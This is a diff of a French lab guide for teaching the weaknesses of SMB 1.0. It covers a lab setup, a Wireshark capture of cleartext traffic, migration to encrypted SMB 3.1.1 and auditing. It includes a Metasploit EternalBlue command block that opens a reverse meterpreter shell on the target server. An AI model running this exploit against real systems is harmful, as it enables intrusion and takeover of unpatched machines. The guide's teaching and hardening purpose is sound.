@@ -1,126 +1,160 @@
-# **Démonstration complète : Capture et analyse du trafic SMB 1.0 avec Wireshark**
-
-Dans cette partie de la démonstration, vous allez capturer le trafic SMB 1.0 non chiffré entre un client Windows et un serveur Windows pour montrer à vos étudiants les risques liés à l’utilisation de SMB 1.0. Vous utiliserez Wireshark pour analyser les paquets réseau et lire les données transférées en clair.
+# Démonstration de failles de sécurité sur SMB 1.0 avec exploitation via Metasploit et comparaison avec SMB 3.1.1**
 
 ---
 
-# **Objectif :**
-- **Montrer** comment SMB 1.0 transfère les fichiers sans chiffrement.
-- **Démontrer** la facilité avec laquelle un attaquant peut intercepter et lire les données.
+# **1. Objectifs pédagogiques**
 
+Dans cette démonstration, vos étudiants vont :
+
+- Comprendre les failles de sécurité associées à SMB 1.0.
+- Simuler une attaque en exploitant la vulnérabilité EternalBlue (CVE-2017-0144) avec Metasploit.
+- Comparer la sécurité offerte par SMB 3.1.1, qui inclut des mécanismes de chiffrement modernes.
+- Utiliser des outils d'analyse réseau comme Wireshark ou Microsoft Message Analyzer pour capturer et analyser le trafic réseau SMB (SMB 1.0 non chiffré vs SMB 3.1.1 chiffré).
 
 ---
-# **Étape 1 : Préparation des machines et réactivation de SMB 1.0**
+
+# **2. Configuration requise**
+
+#### **Machines utilisées**
+
+| Machine        | Rôle                       | Système d'exploitation | IP Statique     | Nom d’hôte      |
+| -------------- | -------------------------- | ---------------------- | --------------- | --------------- |
+| Windows Server | Contrôleur de domaine, SMB  | Windows Server 2016/2019| 192.168.1.10    | SERVER01        |
+| Windows 10     | Client du domaine           | Windows 10 Pro         | 192.168.1.20    | CLIENT01        |
+| Kali Linux     | Test d'attaque Metasploit   | Kali Linux             | 192.168.1.30    | KALI            |
+
 ---
 
-1. **Activer SMB 1.0 sur le serveur Windows** :
+# **3. Schéma réseau ASCII**
 
-   Exécutez cette commande sur votre serveur Windows pour réactiver SMB 1.0 :
+```
+                                +-------------------------+
+                                |      Routeur            |
+                                |    Passerelle: 192.168.1.1|
+                                +-------------------------+
+                                          |
+                                          |
+                              +-----------+------------+
+                              |          Réseau Local            |
+                              |         (192.168.1.0/24)         |
+                              +-----------+------------+
+                                          |
+              +-------------------+       +-------------------+      +-------------------+
+              |  Windows Server    |       |  Windows 10       |      |  Kali Linux       |
+              |   (AD & SMB)       |       |   (Client)        |      |  (Metasploit)     |
+              |   IP: 192.168.1.10 |       |   IP: 192.168.1.20|      |   IP: 192.168.1.30|
+              +-------------------+       +-------------------+      +-------------------+
+              |  Domaine: cafe.local       |  Domaine: cafe.local     |   Test d'attaque  |
+              |  SMB 1.0 & 3.x             |  DNS: 192.168.1.10       |  (Metasploit)     |
+              +-------------------+       +-------------------+      +-------------------+
+```
+
+---
+
+# **4. Étapes détaillées**
+
+#### **4.1. Activation et simulation d'une attaque SMB 1.0**
+
+1. **Activer SMB 1.0 sur le serveur Windows :**
 
    ```powershell
+   # Activer SMB 1.0 pour la démonstration
    Set-SmbServerConfiguration –EnableSMB1Protocol $true
    ```
 
-   **Note** : SMB 1.0 est vulnérable et doit être réactivé uniquement pour la démonstration.
+2. **Simulation d'une attaque avec Metasploit (exploitation EternalBlue) :**
 
----
-# **Étape 2 : Installation de Wireshark sur Kali Linux (si nécessaire)**
----
-
-Wireshark est généralement préinstallé sur Kali Linux. Si ce n'est pas le cas, installez-le en suivant ces étapes :
-
-1. **Mettez à jour Kali Linux** pour s'assurer que vous avez la dernière version des paquets :
+   Sur **Kali Linux**, lancez Metasploit pour exploiter la vulnérabilité EternalBlue :
 
    ```bash
-   sudo apt update && sudo apt upgrade
+   msfconsole
+   use exploit/windows/smb/ms17_010_eternalblue
+   set RHOST 192.168.1.10  # IP du serveur Windows
+   set PAYLOAD windows/x64/meterpreter/reverse_tcp
+   set LHOST 192.168.1.30  # IP de Kali Linux
+   exploit
    ```
 
-2. **Installez Wireshark** :
+3. **Montrer les résultats aux étudiants :**
+   Après exploitation, Metasploit vous donne accès à une session **Meterpreter** sur la machine cible. Montrez comment un attaquant peut prendre le contrôle de la machine cible en raison de l'utilisation de SMB 1.0.
 
-   ```bash
-   sudo apt install wireshark
+---
+
+#### **4.2. Capture et analyse du trafic SMB 1.0 avec Wireshark**
+
+1. **Lancer Wireshark** sur Kali Linux ou une autre machine pour capturer le trafic réseau entre la machine Windows 10 et le serveur Windows avec SMB 1.0 activé.
+
+2. **Capturer le trafic SMB 1.0** pendant un transfert de fichier entre les deux machines via un partage SMB.
+
+3. **Analyser le trafic capturé** : Montrez que le contenu des fichiers est visible en clair, car SMB 1.0 ne chiffre pas les données.
+
+   **Étapes détaillées pour la capture et analyse :**
+   
+   - **Lancer Wireshark** : Tapez `wireshark` dans le terminal de Kali pour lancer l'application.
+   - **Sélectionner l'interface réseau** : Choisissez l'interface appropriée (généralement `eth0` pour Ethernet) et commencez la capture en cliquant sur le bouton vert **"Start"**.
+   - **Effectuer un transfert de fichier** depuis le client Windows 10 vers le serveur Windows avec un dossier partagé SMB 1.0 (`\\192.168.1.10\SharedFolder`).
+   - **Filtrer les paquets SMB** : Dans Wireshark, tapez `smb` dans la barre de filtre et appuyez sur Entrée.
+   - **Analyser les paquets SMB Write** : Recherchez les paquets contenant les données du fichier transféré. Vous verrez que les données sont envoyées en clair.
+
+---
+
+#### **4.3. Passage à SMB 3.1.1 et démonstration de la sécurité**
+
+1. **Désactiver SMB 1.0 et activer SMB 3.1.1** sur le serveur Windows :
+
+   ```powershell
+   # Désactiver SMB 1.0 et activer SMB 3.x avec chiffrement
+   Set-SmbServerConfiguration –EnableSMB1Protocol $false
+   Set-SmbServerConfiguration –EnableSMB2Protocol $true
+   Set-SmbServerConfiguration –EncryptData $true
    ```
 
-   Lors de l'installation, acceptez les permissions supplémentaires pour que Wireshark puisse capturer le trafic réseau en tant qu'utilisateur.
+2. **Répéter le transfert de fichier** avec SMB 3.1.1 activé et capturer à nouveau le trafic avec Wireshark ou **Microsoft Message Analyzer**.
 
----
-# **Étape 3 : Démarrer la capture du trafic SMB avec Wireshark**
----
-
-1. **Ouvrir Wireshark** sur Kali Linux :
-   - Tapez `wireshark` dans le terminal de Kali pour lancer l'interface graphique de Wireshark.
-
-2. **Sélectionner l'interface réseau** :
-   - Dans Wireshark, sélectionnez l'interface réseau que vous utilisez pour la connexion au réseau (souvent `eth0` pour Ethernet ou `wlan0` pour Wi-Fi).
-   - Cliquez sur le bouton vert **"Start capturing packets"** pour commencer à capturer les paquets sur l'interface sélectionnée.
-
-
----
-# **Étape 4 : Effectuer un transfert de fichier avec SMB 1.0**
----
-
-1. **Depuis votre machine Windows 10 (client)** :
-   - Ouvrez l'**Explorateur de fichiers**.
-   - Dans la barre d'adresse, tapez l'adresse du dossier partagé sur le serveur Windows. Par exemple, entrez `\\192.168.1.10\SharedFolder`, où `192.168.1.10` est l'adresse IP du serveur et `SharedFolder` est le nom du dossier partagé.
-   
-2. **Créer un fichier texte** :
-   - Créez un simple fichier texte (par exemple, `test_smb.txt`) avec des données visibles telles que `Ceci est un test pour SMB 1.0`.
-
-3. **Draguez et déposez** le fichier dans le dossier partagé :
-   - Depuis l'Explorateur de fichiers, faites glisser le fichier `test_smb.txt` vers le dossier partagé `SharedFolder` sur le serveur Windows.
-
-4. **Attendez que le fichier soit copié** sur le serveur.
-
----
-# **Étape 5 : Analyser le trafic SMB capturé dans Wireshark**
----
-
-1. **Revenir à Wireshark** :
-   - Pendant que vous copiez le fichier depuis Windows 10 vers le serveur, Wireshark devrait capturer une grande quantité de paquets réseau.
-
-2. **Filtrer le trafic SMB uniquement** :
-   - Dans la barre de filtre de Wireshark en haut de la fenêtre, tapez **`smb`** puis appuyez sur **Entrée**. Cela va filtrer tous les paquets capturés et n'afficher que ceux relatifs au protocole SMB.
-   
-   
-
-3. **Identifier les paquets liés au transfert de fichier** :
-   - Cherchez des paquets **SMB Write AndX Request/Response**. Ces paquets contiennent les données du fichier que vous venez de transférer.
-
-4. **Lire le contenu du fichier dans Wireshark** :
-   - Sélectionnez un paquet **SMB Write AndX Request**. Dans le panneau de détail des paquets, vous verrez une section **"Data"** ou **"Payload"** qui contient les données transférées.
-   - Si vous avez utilisé un fichier texte comme `test_smb.txt`, vous verrez le contenu du fichier (par exemple, `Ceci est un test pour SMB 1.0`) en clair dans cette section.
-
-  
-
-5. **Expliquer aux étudiants** :
-   - Montrez comment les données du fichier sont lisibles en clair. Expliquez que SMB 1.0 ne chiffre pas les données en transit, ce qui rend l'interception très facile pour un attaquant.
-
----
-# **Étape 6 : Sauvegarder la capture (facultatif)**
----
-
-1. **Sauvegarder la capture** pour analyse ultérieure :
-   - Cliquez sur **File > Save As** dans le menu de Wireshark.
-   - Donnez un nom à votre capture, par exemple `SMB1_traffic_capture.pcap`, et enregistrez-la pour une utilisation ultérieure.
+3. **Analyser le trafic capturé** : Montrez que les données sont maintenant chiffrées et que les informations sensibles ne peuvent plus être interceptées.
 
 ---
 
-### **Résumé des actions dans cette section :**
+# **5. Export et analyse des journaux d’audit**
 
-1. **Installer Wireshark** si nécessaire.
-2. **Démarrer la capture du trafic réseau** avec Wireshark.
-3. **Effectuer un transfert de fichier** avec SMB 1.0 activé sur le serveur Windows.
-4. **Filtrer et analyser le trafic SMB** pour montrer que les données sont transférées en clair.
-5. **Expliquer aux étudiants** pourquoi SMB 1.0 est vulnérable aux attaques de type "man-in-the-middle".
+1. **Activer l'audit des accès SMB :**
+
+   ```powershell
+   Set-SmbServerConfiguration –AuditSmb1Access $true
+   ```
+
+2. **Afficher les événements d’audit générés :**
+
+   ```powershell
+   Get-WinEvent -LogName Microsoft-Windows-SMBServer/Audit
+   ```
+
+3. **Exporter les événements d’audit vers un fichier CSV :**
+
+   ```powershell
+   $events = Get-WinEvent -LogName Microsoft-Windows-SMBServer/Audit
+   $events | Export-Csv -Path "C:\AuditSMB.csv" -NoTypeInformation
+   ```
 
 ---
 
-### **Étape suivante : Passer à SMB 3.1.1**
+# **6. Comparaison SMB 1.0 vs SMB 3.1.1**
 
-Maintenant que vous avez montré la vulnérabilité de SMB 1.0, vous pouvez passer à SMB 3.1.1 avec chiffrement et capturer à nouveau le trafic pour montrer que les données sont désormais sécurisées. Vous utiliserez un processus similaire avec Wireshark, mais cette fois, le contenu du fichier sera chiffré et illisible.
+| Fonctionnalité          | SMB 1.0                     | SMB 3.1.1                   |
+| ----------------------- | --------------------------- | --------------------------- |
+| Chiffrement              | Aucun                       | AES-128-GCM / AES-128-CCM    |
+| Vulnérabilité EternalBlue| Oui                         | Non                         |
+| Intégrité des données    | Non                         | Oui (Pré-authentification)   |
+| Performance              | Faible                      | Améliorée                    |
+| Risques de sécurité      | Élevés                      | Réduits                      |
 
 ---
 
-# **Conclusion**
+# **7. Conclusion**
 
-En suivant ces étapes, vous pouvez démontrer de manière concrète et détaillée à vos étudiants les failles de sécurité de **SMB 1.0**, et pourquoi il est essentiel de migrer vers une version sécurisée du protocole, comme **SMB 3.1.1** avec chiffrement AES.
+Cette démonstration permet de :
+- Montrer les risques d'utiliser SMB 1.0, notamment via l'exploitation de la vulnérabilité EternalBlue.
+- Mettre en évidence l'importance de désactiver SMB 1.0 dans les environnements modernes.
+- Enseigner la migration vers SMB 3.1.1 pour bénéficier du chiffrement et d'autres améliorations en matière de sécurité.
+- Utiliser des outils comme **Wireshark** et **Metasploit** pour analyser le comportement des protocoles réseau.
+
